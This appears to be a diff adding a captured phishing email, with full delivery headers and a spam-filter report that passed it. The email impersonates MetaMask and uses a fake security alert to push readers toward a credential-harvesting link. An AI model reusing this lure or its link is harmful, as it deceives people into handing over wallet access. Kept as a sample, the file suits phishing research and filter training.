@@ -1,0 +1,169 @@
+Return-Path: <postmaster@0ca22451cb.nxcli.io>
+Delivered-To: info@go-onriders.com
+Received: from rin6.dizinc.com
+	by rin6.dizinc.com with LMTP
+	id EGU9AgnsA2hM2zkAQ+45pw
+	(envelope-from <postmaster@0ca22451cb.nxcli.io>)
+	for <info@go-onriders.com>; Sat, 19 Apr 2025 14:31:37 -0400
+Return-path: <postmaster@0ca22451cb.nxcli.io>
+Envelope-to: info@go-onriders.com
+Delivery-date: Sat, 19 Apr 2025 14:31:37 -0400
+Received: from cloudhost-2913600.us-midwest-1.nxcli.net ([8.29.155.219]:46506)
+	by rin6.dizinc.com with esmtps  (TLS1.2) tls TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256
+	(Exim 4.98.1)
+	(envelope-from <postmaster@0ca22451cb.nxcli.io>)
+	id 1u6CyX-0000000Fui6-3Ek8
+	for info@go-onriders.com;
+	Sat, 19 Apr 2025 14:31:36 -0400
+Comment: DomainKeys? See http://domainkeys.sourceforge.net/
+DomainKey-Signature: a=rsa-sha1; q=dns; c=nofws;
+  s=default; d=0ca22451cb.nxcli.io;
+  b=ZUhQ7mZCGSBtNzJ+B1o+3LdQr1HBQWWk5M1JjdOJkXKXM2htsmuY/XrYkXnKi3aUeN9nLfrG1YEitabVhARiv2a+vTnw7FnLUna83odj4NaD0ZtiXiKZNAy1JtEH6LQ9pcsxpbNUHqU0fdaSSU0G/URuf7CVCFnDurEcywVgg7sU/5+xiklnT1uOtKenxpL46L5PrIiUJuSL5Hgg658FQrTCzJVRFUf6hk4P0ygVb1fWymeTLgIfYbvV64O+bKL1ozlpRVptHGMdxKbpilLNMADaKvQHiCnk/Vf9Wmdhmy+hCxF2Xay/Q/xyETt+3nl0zwbpigLDPFUZk6Mj8+46tQ==;
+  h=Received:Date:To:From:Reply-To:Subject:Message-ID:List-Unsubscribe:MIME-Version:Content-Type:Content-Transfer-Encoding;
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed; d=0ca22451cb.nxcli.io; h=
+	date:to:from:reply-to:subject:message-id:list-unsubscribe
+	:mime-version:content-type:content-transfer-encoding; s=default;
+	 bh=69+DZRcfBw5xPgEvua36GG3LNVfIr5QPVSxPrrchx+o=; b=EyrCKU2L5HfH
+	ZBW4gpraHqvPMNLapjoIbg6GNk/lBBV9+qNcP22w+UuwsBuhl/T5G/m/KZgUMoq5
+	SDlPhYpR3G42OtUsycjKHYq00fpRe+aYQFmW1rniJDSvSDGqm7CkrXqFClAEdZAV
+	yLGcqeBgNPgASpt0FsrL2RL99rKP6fEdN0iGH0aTh6iBegQsqv3RO9iuvalRNPbf
+	++5hHyc9aUoiSflokRsaOqgrCT9qIpUGizSrFDQAr0UaMzuqm7HhMIBMZXqUVWiy
+	jxkJ3sWvOAdx/AjCMvk39LJZ3+RRnZwqZyf4CmchsdY6rdKzUUcGgD1fTKUHs8nV
+	A04EQaiTCA==
+Received: (qmail 3207 invoked by uid 10198); 19 Apr 2025 18:19:39 +0000
+Date: Sat, 19 Apr 2025 18:19:14 +0000
+To: info@go-onriders.com
+From: MetaMask Security <info@wallet-support.net>
+Reply-To: info@wallet-support.net
+Subject: Security Alert: Verify Your MetaMask Account
+Message-ID: <42ab117d7fa930fede65208c2d9a100a@wallet-support.net>
+List-Unsubscribe: mailto:bounce503-HTmKMr4LGlMKIIJ@wallet-support.net?subject=list-unsubscribe
+MIME-Version: 1.0
+Content-Type: multipart/alternative;
+	boundary="104fb56615d789ba057a30b871041e611"
+Content-Transfer-Encoding: 8bit
+X-MagicSpam-TUUID: c7105e04-a4da-4af5-911f-9d9a1a5e7f72
+X-MagicSpam-SUUID: 0b8842e0-6015-4386-820c-65fdc4609aa5
+X-Spam-Status: No, score=1.7
+X-Spam-Score: 17
+X-Spam-Bar: +
+X-Ham-Report: Spam detection software, running on the system "rin6.dizinc.com",
+ has NOT identified this incoming email as spam.  The original
+ message has been attached to this so you can view it or label
+ similar future email.  If you have any questions, see
+ root\@localhost for details.
+ Content preview:  Verify Your Wallet Access We detected an update to your session
+    activity. To maintain uninterrupted access, please confirm your identity
+   below. Activating Two-Factor Authentication (2FA) helps secure your wallet
+    against unaut [...] 
+ Content analysis details:   (1.7 points, 5.0 required)
+  pts rule name              description
+ ---- ---------------------- --------------------------------------------------
+  0.0 URIBL_BLOCKED          ADMINISTRATOR NOTICE: The query to URIBL was blocked.
+                             See
+                             http://wiki.apache.org/spamassassin/DnsBlocklists#dnsbl-block
+                              for more information.
+                             [URI: pure-digital.com.au]
+                             [URI: nxcli.io]
+                             [URI: wikimedia.org]
+  0.0 RCVD_IN_VALIDITY_SAFE_BLOCKED RBL: ADMINISTRATOR NOTICE: The query to
+                              Validity was blocked.  See
+                             https://knowledge.validity.com/hc/en-us/articles/20961730681243
+                              for more information.
+                             [8.29.155.219 listed in sa-accredit.habeas.com]
+  0.0 RCVD_IN_VALIDITY_RPBL_BLOCKED RBL: ADMINISTRATOR NOTICE: The query to
+                              Validity was blocked.  See
+                             https://knowledge.validity.com/hc/en-us/articles/20961730681243
+                              for more information.
+                             [8.29.155.219 listed in bl.score.senderscore.com]
+  0.0 RCVD_IN_VALIDITY_CERTIFIED_BLOCKED RBL: ADMINISTRATOR NOTICE: The
+                             query to Validity was blocked.  See
+                             https://knowledge.validity.com/hc/en-us/articles/20961730681243
+                              for more information.
+                           [8.29.155.219 listed in sa-trusted.bondedsender.org]
+  0.8 DKIM_ADSP_NXDOMAIN     No valid author signature and domain not in DNS
+  0.1 DKIM_SIGNED            Message has a DKIM or DK signature, not necessarily valid
+  0.0 KAM_DMARC_STATUS       Test Rule for DKIM or SPF Failure with Strict
+                             Alignment
+  0.1 DKIM_INVALID           DKIM or DK signature exists, but is not valid
+  0.0 HEADER_FROM_DIFFERENT_DOMAINS From and EnvelopeFrom 2nd level mail
+                             domains are different
+  0.0 HTML_MESSAGE           BODY: HTML included in message
+  0.7 HTML_IMAGE_ONLY_20     BODY: HTML: images with 1600-2000 bytes of words
+X-Spam-Flag: NO
+
+This is a multi-part message in MIME format.
+
+--104fb56615d789ba057a30b871041e611
+Content-Type: text/plain; charset=UTF-8
+Content-Transfer-Encoding: 8bit
+
+
+
+
+
+  
+    
+      
+      Verify Your Wallet Access
+    
+  
+  
+    
+      We detected an update to your session activity. To maintain uninterrupted access, please confirm your identity below.
+      Activating Two-Factor Authentication (2FA) helps secure your wallet against unauthorized access—even if your password is known.
+      
+        🔒 Secure My Wallet Now
+      
+      For your protection, this session will expire shortly.
+      If this wasn't initiated by you, please disregard this message.
+      Regards,Support Team
+    
+  
+  
+    
+      © 2025 Account Services. All rights reserved.
+    
+  
+
+
+
+
+--104fb56615d789ba057a30b871041e611
+Content-Type: text/html; charset=UTF-8
+Content-Transfer-Encoding: 8bit
+
+<!DOCTYPE html>
+<html>
+<body style="margin:0;padding:20px;font-family:Arial,sans-serif;background-color:#fff;color:#333;">
+<table width="100%" cellpadding="0" cellspacing="0" style="max-width:600px;margin:auto;border:1px solid #ddd;border-radius:6px;">
+  <tr>
+    <td style="background-color:#fff;padding:20px;text-align:center;">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg" width="60" alt="Access Logo" style="margin-bottom:20px;">
+      <h2 style="color:#f6851b;font-size:20px">Verify Your Wallet Access</h2>
+    </td>
+  </tr>
+  <tr>
+    <td style="padding:20px;">
+      <p>We detected an update to your session activity. To maintain uninterrupted access, please confirm your identity below.</p>
+      <p>Activating Two-Factor Authentication (2FA) helps secure your wallet against unauthorized access—even if your password is known.</p>
+      <p style="text-align:center;margin:30px 0">
+        <a href="https://micro-pep.pure-digital.com.au/nt/" style="background-color:#f6851b;color:#fff;text-decoration:none;padding:12px 22px;border-radius:5px;font-weight:bold">🔒 Secure My Wallet Now</a>
+      </p>
+      <p style="text-align:center;font-size:13px;color:#777;">For your protection, this session will expire shortly.</p>
+      <p>If this wasn't initiated by you, please disregard this message.</p>
+      <p>Regards,<br>Support Team</p>
+    </td>
+  </tr>
+  <tr>
+    <td style="background-color:#f2f2f2;text-align:center;font-size:12px;color:#888;padding:10px;border-top:1px solid #ddd;">
+      © 2025 Account Services. All rights reserved.
+    </td>
+  </tr>
+</table>
+</body>
+</html>
+
+
+
+--104fb56615d789ba057a30b871041e611--
